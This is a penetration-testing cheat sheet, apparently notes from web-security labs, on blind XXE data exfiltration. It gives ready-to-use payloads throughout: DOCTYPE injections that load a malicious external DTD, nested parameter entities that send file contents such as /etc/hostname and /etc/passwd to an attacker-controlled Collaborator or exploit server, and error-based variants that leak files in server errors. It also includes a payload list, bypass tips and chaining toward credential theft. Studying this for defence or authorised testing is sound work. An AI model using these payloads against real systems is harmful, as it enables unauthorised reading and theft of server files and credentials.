# XXE - Blind data exfiltration (external DTD + error-based)

When blind XXE is confirmed but no data appears in the response, exfiltrate file contents by hosting a malicious external DTD. The DTD uses nested parameter entities to either send file contents out-of-band via a URL parameter, or trigger an error message that includes the file contents.

## Quick reference
```xml
<!-- In the XML request - load your external DTD -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLOIT-SERVER/malicious.dtd"> %xxe;]>

<!-- malicious.dtd - OOB exfil via Collaborator -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB/?x=%file;'>">
%eval;
%exfil;

<!-- malicious.dtd - error-based exfil (no external network needed) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
<!-- error message contains: "file:///invalid/root:x:0:0:..." -> file contents leaked -->
```

## Root cause
XML spec restricts nested entity definitions in the internal DTD subset - you can't define an entity whose value references another parameter entity inline. But an external DTD can define these nested structures. The `&#x25;` trick (`%` hex entity) escapes the `%` so the outer parser doesn't interpret it yet, deferring evaluation to when `%eval;` is triggered.

**Why `&#x25;`:** Inside a DTD entity value, a literal `%` would start another parameter entity reference immediately. `&#x25;` is the numeric character reference for `%` - it's stored as a literal `%` in the entity value and only becomes a parameter entity reference when that entity is later expanded.

## Find it
Same as blind OOB - once OOB confirmed via Collaborator, escalate to data exfil:
1. Host DTD on your exploit server.
2. Point the XML's DOCTYPE to your DTD URL.
3. For OOB: check Collaborator for HTTP request with file content in query string.
4. For error-based: invalid path in DTD causes server error containing file content in response.

## Technique
**OOB exfil via external DTD:**
1. Copy Burp Collaborator subdomain.
2. Save on exploit server as `malicious.dtd`:
   ```
   <!ENTITY % file SYSTEM "file:///etc/hostname">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB/?x=%file;'>">
   %eval;
   %exfil;
   ```
3. Note the exploit server URL (e.g., `https://exploit-server.net/malicious.dtd`).
4. In the XML POST, inject:
   ```xml
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-server.net/malicious.dtd"> %xxe;]>
   ```
5. Send -> poll Collaborator -> HTTP request arrives with `?x=<hostname>` in URL.

**Error-based exfil:**
1. Save on exploit server as `malicious.dtd`:
   ```
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
   %eval;
   %exfil;
   ```
2. Same DOCTYPE injection pointing to your DTD URL.
3. Send -> server tries to open `file:///invalid/<contents-of-passwd>` -> file-not-found error returned in response body containing the file contents.

## Payload arsenal
```
# Exfil targets
file:///etc/hostname
file:///etc/passwd
file:///home/carlos/secret
file:///proc/self/cmdline

# DTD URL injection in XML
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLOIT/x.dtd"> %xxe;]>

# OOB DTD (on exploit server)
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB/?x=%file;'>">
%eval;
%exfil;

# Error-based DTD (on exploit server)
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%exfil;
```

## Bypasses
| Issue | Approach |
|---|---|
| OOB HTTP outbound blocked | Use error-based exfil (no outbound needed) |
| File content too long for URL | Switch to error-based; errors truncate less often |
| DTD fetch blocked | Try local DTD repurposing -> see Hidden-attack-surfaces/ |
| Exploit server needs HTTPS | Most lab exploit servers serve HTTPS by default |

## Exploitation walkthrough
**OOB exfil:**
1. Collaborator -> copy subdomain. Exploit server -> save OOB DTD with Collab URL.
2. Inject DOCTYPE pointing to DTD URL in stock check XML -> send.
3. Poll Collaborator -> HTTP request: `GET /?x=<hostname>` -> extract hostname value -> submit.

**Error-based exfil:**
1. Exploit server -> save error DTD targeting `/etc/passwd`. Note URL.
2. Inject DOCTYPE -> send.
3. Response body contains error: `file:///invalid/root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:...`
4. Extract contents from error.

## Chaining
- Exfiltrated credentials -> database access / [SQL-injection](../../SQL-injection/)
- `/etc/passwd` + SSH -> lateral movement
- OOB exfil pattern overlaps with [SSRF](../../SSRF/) blind OAST technique

## Tools
- **Burp Collaborator** - receive OOB HTTP with file contents in URL param
- **Exploit server** - host the malicious DTD (lab provides one; in real engagements use your VPS)

## Labs

### Exploiting blind XXE to exfiltrate data using a malicious external DTD [Practitioner]
Host DTD with nested param entities (OOB via Collaborator). Inject `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "DTD-URL"> %xxe;]>` in stock XML. Collaborator receives `GET /?x=<hostname>`. Key insight: external DTD bypasses internal-subset restriction on nested entity definitions; `&#x25;` defers `%` interpretation.

### Exploiting blind XXE to retrieve data via error messages [Practitioner]
Host error-based DTD pointing `file:///invalid/%file;` (invalid path containing file contents). Inject same DOCTYPE. Server returns error message containing `/etc/passwd` contents. Key insight: no outbound HTTP needed - the error itself carries the file data in the response body.

## Real-world notes
- The `&#x25;` nested entity trick is a fundamental XXE pattern - memorize it.
- Error-based is often more reliable than OOB when egress is restricted or Collaborator isn't available.
- In real engagements, host DTD on a VPS or Burp's collaborator; the exploit server is a lab convenience.

## References
- https://portswigger.net/web-security/xxe/blind
